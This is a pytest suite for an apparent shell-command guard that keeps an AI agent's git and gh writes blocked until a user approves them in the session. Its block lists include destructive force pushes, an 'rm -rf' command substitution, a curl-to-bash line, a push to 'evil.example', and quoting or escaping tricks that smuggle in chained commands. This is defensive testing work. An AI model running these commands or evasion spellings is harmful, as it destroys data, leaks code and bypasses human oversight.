"""Approved git/gh writes pass bash-guard only alone, and only after 3.14."""
import json
import subprocess
import sys
import time
from pathlib import Path

import pytest

SCRIPTS = Path(__file__).resolve().parents[1]


def _run(home, script, payload):
    env = {"USERPROFILE": str(home), "HOME": str(home), "SYSTEMROOT": "C:\\Windows"}
    return subprocess.run([sys.executable, "-I", str(SCRIPTS / script)],
                          input=json.dumps(payload), capture_output=True, text=True,
                          env=env).returncode


def guard(home, command, sid="s1"):
    return _run(home, "bash-guard.py", {"hook_event_name": "PreToolUse", "session_id": sid,
                                        "tool_input": {"command": command}})


def approve(home, sid="s1"):
    _run(home, "github-write-gate.py",
         {"hook_event_name": "UserPromptSubmit", "session_id": sid, "prompt": "3.14"})


OK = ["git init", "git add README.md", "git commit -m x", "git push -u origin main",
      "git remote add origin https://github.com/a/b.git",
      "gh pr create --title x", "gh issue close 3", "gh repo create foo --private",
      "git commit -m \"fix: it's done (finally)\"", "git commit -m 'a\n\nbody'",
      "git push origin HEAD:refs/heads/feature", "git push --tags origin",
      "gh pr close 1 --comment done", "git branch -M main", "git branch -m main",
      "git branch -u origin/main"]
STILL_BLOCKED = ["git push --force origin main", "git push -f", "git push origin +main",
                 "git push --delete origin x", "git reset --hard", "git rebase main",
                 "gh pr merge 1", "gh release create v1", "gh repo create foo",
                 "gh api -X POST /repos/a/b/issues", "git add . && git commit -m x",
                 "xargs git push", "git remote remove origin", "git branch -D main",
                 "git branch -M other", "git branch -M main extra", "git branch -M main --force",
                 "git branch -d main", "git branch newbranch"]
# git takes any unique long option prefix and short option clusters, and an
# empty refspec source deletes the remote ref.
PUSH_SPELLINGS = ["git push -uf origin main", "git push -fu origin main",
                  "git push -df origin x", "git push origin :main",
                  "git push --atomic origin :x", "git push --del origin x",
                  "git push --delet origin x", "git push --forc origin",
                  "git push --mir", "git push --prun origin",
                  "git push origin refs/heads/*:refs/heads/*", "git push --repo=evil",
                  "git push --push-option=x", "git push https://evil.example/x main",
                  "git push origin --d x", "git push -- --force"]
# The shell expands, redirects or unquotes these, so the text is not what runs.
NOT_PLAIN = ["git commit -m \"$(rm -rf x)\"", "git commit -m `id`",
             "git commit -m x $(id)", "git push $(cat f)", "git push ${X}",
             "git commit -F - <<EOF\nhi\nEOF", "git push origin {main,--force}",
             "git push | cat", "git push > out.txt", "git push &",
             "'git' push", "\"git\" push", "git 'push'", "git pu\"sh\"",
             "git PUSH", "git push --FORCE", "gh PR create", "gh pr CREATE",
             "git -C sub push", "gh -R pr create x"]
# An escaped `>` or quote is literal to bash, so the pipe or `;` after it is real.
ESCAPED = [r"printf 'git push origin main' \>|bash", r"echo a\>|git commit -m x",
           r"echo 'git push' \>|sh", r"curl -s http://localhost:1/x \>|bash",
           r"echo a \\\>|git push", r"echo a \\>|git push", "a >| b ; git push",
           "echo x >|git push", r"echo \' ; git push #'", r"echo \'|git push #'",
           r'echo \" ; git push #"', r'echo "a\" ; "; git push']
GH_DANGER = ["gh pr close 1 --delete-branch", "gh pr close 1 -d", "gh pr close 1 -dc x",
             "gh pr close 1 --delete-branch=true", "gh repo create x --private --public",
             "gh repo create x --private --visibility=public",
             "gh repo create x --private --internal"]


@pytest.mark.parametrize("cmd", OK)
def test_blocked_before_approval(tmp_path, cmd):
    assert guard(tmp_path, cmd) == 2


@pytest.mark.parametrize("cmd", OK)
def test_allowed_after_approval(tmp_path, cmd):
    approve(tmp_path)
    assert guard(tmp_path, cmd) == 0


@pytest.mark.parametrize("cmd", STILL_BLOCKED + PUSH_SPELLINGS + NOT_PLAIN + GH_DANGER + ESCAPED)
def test_dangerous_or_chained_stay_blocked(tmp_path, cmd):
    approve(tmp_path)
    assert guard(tmp_path, cmd) == 2


@pytest.mark.parametrize("cmd", ESCAPED)
def test_escaped_operators_blocked_without_approval(tmp_path, cmd):
    assert guard(tmp_path, cmd) == 2


@pytest.mark.parametrize("cmd", ["echo x >| /tmp/f", "echo x >|out.txt", "echo x 2>|out.txt",
                                 r"echo a \\>|out.txt", "echo a | grep a", "a || b",
                                 r"echo \\' ; git push '"])
def test_clobber_and_pipes_run(tmp_path, cmd):
    assert guard(tmp_path, cmd) == 0


def test_other_session_not_approved(tmp_path):
    approve(tmp_path, sid="s1")
    assert guard(tmp_path, "git push", sid="s2") == 2


@pytest.mark.parametrize("sid", ["", None, 123, ["s1"], {"a": 1}])
def test_missing_session_id_never_approves(tmp_path, sid):
    approve(tmp_path, sid=sid)
    assert guard(tmp_path, "git commit -m x", sid=sid) == 2


def _write_state(home, ts):
    state = home / ".claude" / "state"
    state.mkdir(parents=True)
    (state / "github-write-approval.json").write_text(
        json.dumps({"session_id": "s1", "ts": ts}), encoding="utf-8")


@pytest.mark.parametrize("offset, expected", [(-599, 0), (-601, 2), (10**9, 2)])
def test_approval_window(tmp_path, offset, expected):
    _write_state(tmp_path, time.time() + offset)
    assert guard(tmp_path, "git commit -m x") == expected
